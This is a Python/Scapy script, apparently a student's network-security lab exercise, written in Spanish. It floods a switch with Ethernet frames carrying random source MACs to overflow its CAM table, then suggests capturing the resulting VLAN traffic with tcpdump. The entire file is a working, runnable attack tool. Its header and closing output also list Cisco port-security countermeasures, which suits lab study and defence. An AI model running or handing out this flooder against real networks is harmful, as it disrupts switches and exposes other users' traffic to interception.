#!/usr/bin/env python3
"""
=============================================================
  ATAQUE 05 — MAC Flooding (Desbordamiento tabla CAM)
=============================================================
  Autor      : Estudiante 20211150
  Red de lab : 192.168.150.0/24
  Atacante   : 192.168.150.254 (Kali Linux - eth0)
  Target     : SW1-20211150 y SW2-20211150 (tabla CAM)
  Interfaz   : eth0

  DESCRIPCIÓN:
    Los switches almacenan en su tabla CAM el mapeo MAC → Puerto.
    Esta tabla tiene capacidad limitada (típicamente 8000-16000 entradas).

    Al inundar el switch con tramas de MACs fuente aleatorias:
    1. La tabla CAM se llena completamente
    2. El switch no puede aprender nuevas MACs
    3. El switch comienza a reenviar tramas a TODOS los puertos
       (actúa como HUB → modo "fail open")
    4. El atacante puede capturar TODO el tráfico de la VLAN

    VERIFICAR en el switch:
      show mac address-table count   → ver cuántas entradas hay
      show mac address-table         → ver la tabla completa

  USO:
    sudo python3 05_mac_flooding.py
    sudo python3 05_mac_flooding.py eth0

  CONTRAMEDIDA (en el switch Cisco):
    SW1(config-if)# switchport port-security
    SW1(config-if)# switchport port-security maximum 5
    SW1(config-if)# switchport port-security violation restrict
    SW1(config-if)# switchport port-security mac-address sticky
=============================================================
"""

import sys
import time
import random
import signal
from scapy.all import Ether, sendp, conf

# ─── CONFIGURACIÓN ────────────────────────────────────────
INTERFAZ    = "eth0"
DELAY       = 0.0        # 0 = máxima velocidad
LOTE        = 200        # paquetes por lote (más eficiente)
MAX_PKTS    = 0          # 0 = infinito
PAYLOAD_TAM = 64         # bytes de payload
# ──────────────────────────────────────────────────────────

enviados    = 0
macs_unicas = set()
corriendo   = True


def salir(sig, frame):
    global corriendo
    print(f"\n[!] Detenido.")
    print(f"    Tramas enviadas   : {enviados}")
    print(f"    MACs únicas usadas: {len(macs_unicas)}")
    print("\n  Verifica en el switch:")
    print("  show mac address-table count")
    corriendo = False
    sys.exit(0)


def mac_aleatoria():
    primer = (random.randint(0, 255) & 0xFE) | 0x02
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        primer,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def construir_lote(tam_lote):
    lote = []
    for _ in range(tam_lote):
        src = mac_aleatoria()
        dst = mac_aleatoria()
        macs_unicas.add(src)
        payload = bytes(random.randint(0, 255) for _ in range(PAYLOAD_TAM))
        pkt = Ether(src=src, dst=dst) / payload
        lote.append(pkt)
    return lote


def main():
    global enviados, corriendo
    interfaz = sys.argv[1] if len(sys.argv) > 1 else INTERFAZ

    signal.signal(signal.SIGINT, salir)
    conf.verb = 0

    print("=" * 55)
    print("  ATAQUE MAC Flooding — Laboratorio 20211150")
    print("=" * 55)
    print(f"  Interfaz  : {interfaz}")
    print(f"  Target    : SW1-20211150 / SW2-20211150")
    print(f"  Lote      : {LOTE} tramas")
    print(f"  Límite    : {'∞' if MAX_PKTS == 0 else MAX_PKTS} paquetes")
    print("=" * 55)
    print("  Inundando tabla CAM del switch...")
    print("  Ctrl+C para detener\n")

    inicio = time.time()

    while corriendo:
        if MAX_PKTS and enviados >= MAX_PKTS:
            break

        tam_actual = min(LOTE, MAX_PKTS - enviados) if MAX_PKTS else LOTE
        lote = construir_lote(tam_actual)

        try:
            sendp(lote, iface=interfaz, verbose=False)
            enviados += len(lote)
            elapsed = time.time() - inicio
            pps = enviados / elapsed if elapsed > 0 else 0
            print(
                f"  [+] Tramas: {enviados:>8}  |  "
                f"MACs únicas: {len(macs_unicas):>6}  |  "
                f"{pps:>7.0f} pkt/s",
                end="\r"
            )
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

        if DELAY > 0:
            time.sleep(DELAY)

    elapsed = time.time() - inicio
    print(f"\n[*] Finalizado en {elapsed:.1f}s")
    print(f"    Tramas enviadas   : {enviados}")
    print(f"    MACs únicas usadas: {len(macs_unicas)}")
    print(f"    Velocidad promedio : {enviados/elapsed:.0f} pkt/s")
    print("\n[*] Ahora captura tráfico con:")
    print("    tcpdump -i eth0 -w captura_mac_flood.pcap")
    print("\n  CONTRAMEDIDA:")
    print("  SW1(config-if)# switchport port-security")
    print("  SW1(config-if)# switchport port-security maximum 5")
    print("  SW1(config-if)# switchport port-security violation restrict")

if __name__ == "__main__":
    main()
